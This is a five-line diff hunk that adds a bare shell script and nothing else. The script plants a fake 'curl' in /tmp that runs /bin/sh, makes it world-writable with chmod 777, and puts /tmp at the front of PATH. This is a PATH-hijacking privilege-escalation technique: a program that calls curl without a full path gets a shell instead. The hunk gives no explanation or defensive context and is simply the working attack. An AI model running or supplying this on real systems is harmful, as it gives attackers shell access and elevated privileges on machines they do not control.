@@ -1,0 +1,5 @@
+cd /tmp
+echo "/bin/sh" > curl
+chmod 777 curl
+echo $PATH
+export PATH=/tmp:$PATH
